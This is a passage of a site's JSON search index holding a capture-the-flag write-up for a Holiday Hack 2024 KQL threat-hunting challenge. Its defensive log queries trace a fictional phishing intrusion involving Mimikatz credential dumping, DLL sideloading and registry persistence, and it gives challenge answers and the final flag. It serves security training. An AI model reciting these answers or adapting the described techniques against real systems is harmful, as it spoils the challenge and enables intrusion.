lead us to other parts of their operation, so let’s find it.”\nWhat was the IP for the domain where the file was hosted?\nSolution\nlet FIRST_TIMESTAMP = toscalar(Email | where subject contains \"breach\" | order by timestamp asc ); let BOETIE_IP = toscalar(Employees | where username contains \"boetie\" | project ip_addr ); let MALWARE_IP = OutboundNetworkEvents | where timestamp \u003e= FIRST_TIMESTAMP | where src_ip == BOETIE_IP | order by timestamp asc | limit 1 | extend domain = tostring(split(url, \"/\")[2]) | join PassiveDns on $left.domain == $right.domain | distinct ip ; MALWARE_IP 182.56.23.122 Question 5 Let’s back up for a moment. Now that we’re thinking this through, how did the unknown threat actor gain the credentials to execute this attack? We know that three users have been sending phishing emails, and we’ve identified the domain they used.\nIt’s time to dig deeper into the AuthenticationEvents and see if anything else unusual happened that might explain how these accounts were compromised.\nEve Snowshoes suggests, “We need to explore the AuthenticationEvents for these users. Attackers often use compromised accounts to blend in and send phishing emails internally. This might reveal how they gained access to the credentials.”\nLet’s take a closer look at the authentication events. I wonder if any connection events from 182.56.23.122. If so what hostname was accessed?\nSolution\nlet FIRST_TIMESTAMP = toscalar(Email | where subject contains \"breach\" | order by timestamp asc ); let BOETIE_IP = toscalar(Employees | where username contains \"boetie\" | project ip_addr ); let MALWARE_IP = toscalar(OutboundNetworkEvents | where timestamp \u003e= FIRST_TIMESTAMP | where src_ip == BOETIE_IP | order by timestamp asc | limit 1 | extend domain = tostring(split(url, \"/\")[2]) | join PassiveDns on $left.domain == $right.domain | distinct ip ); AuthenticationEvents | where src_ip == MALWARE_IP | project hostname WebApp-ElvesWorkshop Question 6 It appears someone accessed the WebApp-ElvesWorkshop from the IP address 182.56.23.122. This could be a key moment in the attack. We need to investigate what was run on the app server and, more importantly, if the threat actor dumped any credentials from it.\nEve Snowshoes, “Accessing the web app from an external IP is a major red flag. If they managed to dump credentials from the app server, that could explain how they gained access to other parts of the system.”\nWhat was the script that was run to obtain credentials?\nSolution\nlet TIMEWINDOW = InboundNetworkEvents | where src_ip == \"182.56.23.122\" | order by timestamp asc | summarize minTime = min(timestamp), maxTime = max(timestamp)+1h ; ProcessEvents | where timestamp between (toscalar(TIMEWINDOW | project minTime) .. toscalar(TIMEWINDOW | project maxTime) ) | where hostname has \"WebApp-ElvesWorkshop\" | order by timestamp asc | take 1 Invoke-Mimikatz.ps1 Question 7 Okay back to Noel, after downloading the file, Noel Boetie followed the instructions in the email and ran it, but mentioned that nothing appeared to happen.\nSince the email came from an internal source, Noel assumed it was safe - yet this may have been the moment the unknown threat actor silently gained access. We need to identify exactly when Noel executed the file to trace the beginning of the attack.\nEve Snowshoes, “It’s easy to see why Noel thought the email was harmless - it came from an internal account. But attackers often use compromised internal sources to make their phishing attempts more believable.”\nWhat is the timestamp where Noel executed the file?\nSolution\nlet FIRST_TIMESTAMP = Email | where subject contains \"breach\" | order by timestamp asc ; let BOETIE_DATA = Employees | where username contains \"boetie\" | project ip_addr, username ; ProcessEvents | where username == toscalar(BOETIE_DATA | project username) | where timestamp \u003e toscalar(FIRST_TIMESTAMP | project timestamp) | order by timestamp asc 2024-12-12T15:14:38Z Question 9 After Noel ran the file, strange activity began on the system, including the download of a file called holidaycandy.hta. Keep in mind that attackers often use multiple domains to host different pieces of malware.\nEve explains, “Attackers frequently spread their operations across several domains to evade detection.”\nWhat domain was the holidaycandy.hta file downloaded from?\nSolution\nOutboundNetworkEvents | where url has \"holidaycandy.hta\" | extend domain = tostring(split(url, \"/\")[2]) | distinct domain compromisedchristmastoys.com Question 10 An interesting series of events has occurred: the attacker downloaded a copy of frosty.txt, decoded it into a zip file, and used tar to extract the contents of frosty.zip into the Tasks directory.\nThis suggests the possibility that additional payloads or tools were delivered to Noel’s laptop. We need to investigate if any additional files appeared after this sequence.\nEve Snowshoes, “When an attacker drops files like this, it’s often the prelude to more malicious actions. Let’s see if we can find out what else landed on Noel’s laptop.”\nDid any additional files end up on Noel’s laptop after the attacker extracted frosty.zip?\nwhat was the first file that was created after extraction?\nSolution\nlet BOETIE_DATA = Employees | where username contains \"boetie\" | project ip_addr, username, hostname ; let TIMEWINDOW = ProcessEvents | where hostname in (BOETIE_DATA | project hostname) | where process_commandline contains \"frosty.zip\" | summarize maxTimestamp = max(timestamp) ; FileCreationEvents | where hostname in (BOETIE_DATA | project hostname) | where timestamp \u003e= toscalar(TIMEWINDOW | project maxTimestamp) sqlwriter.exe Question 11 In the previous question, we discovered that two files, sqlwriter.exe and frost.dll, were downloaded onto Noel’s laptop. Immediately after, a registry key was added that ensures sqlwriter.exe will run every time Noel’s computer boots.\nThis persistence mechanism indicates the attacker’s intent to maintain long-term control over the system.\nEve Snowshoes, “Adding a registry key for persistence is a classic move by attackers to ensure their malicious software runs automatically. It’s crucial to understand how this persistence is set up to prevent further damage.”\nWhat is the name of the property assigned to the new registry key?\nSolution\nlet BOETIE_DATA = Employees | where username contains \"boetie\" | project ip_addr, username, hostname ; let TIMEWINDOW = ProcessEvents | where hostname in (BOETIE_DATA | project hostname) | where process_commandline contains \"frosty.zip\" | summarize maxTimestamp = max(timestamp) ; let FILECREATEDWINDOW = FileCreationEvents | where hostname in (BOETIE_DATA | project hostname) | where timestamp \u003e= toscalar(TIMEWINDOW | project maxTimestamp) | take 1 | project timestamp ; ProcessEvents | where hostname in (BOETIE_DATA | project hostname) | where timestamp \u003e= toscalar(FILECREATEDWINDOW | project timestamp) frosty Question 12 Congratulations! You’ve successfully identified the threat actor’s tactics. The attacker gained access to WebApp-ElvesWorkshop from the IP address 182.56.23.122, dumped credentials, and used those to send phishing emails internally to Noel.\nThe malware family they used is called Wineloader, which employs a technique known as DLL sideloading. This technique works by placing a malicious DLL in the same directory as a legitimate executable (in this case, sqlwriter.exe).\nWhen Windows tries to load a referenced DLL without a full path, it checks the executable’s current directory first, causing the malicious DLL to load automatically. Additionally, the attacker created a scheduled task to ensure sqlwriter.exe runs on system boot, allowing the malicious DLL to maintain persistence on the system.\nTo obtain your FINAL flag use the KQL below with your last answer!\nSolution\nlet finalflag = \"frosty\"; let base64_encoded = base64_encode_tostring(finalflag); print base64_encoded ZnJvc3R5 Flag The flag is the last question answered. Thus, ZnJvc3R5 is the flag.",
    "description": "Welcome to your mission to solve the The Great Elf Conflict! To do so, you’ll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.\nYour next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival. Alt text",
    "tags": [],
    "title": "Microsoft Kc7",
    "uri": "/act2/microsoft-kc7/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "This is a new chapter.",
    "description": "This is a new chapter.",
    "tags": [],
    "title": "About",
    "uri": "/about/index.html"
  },
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "HHC 2024",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  }
]
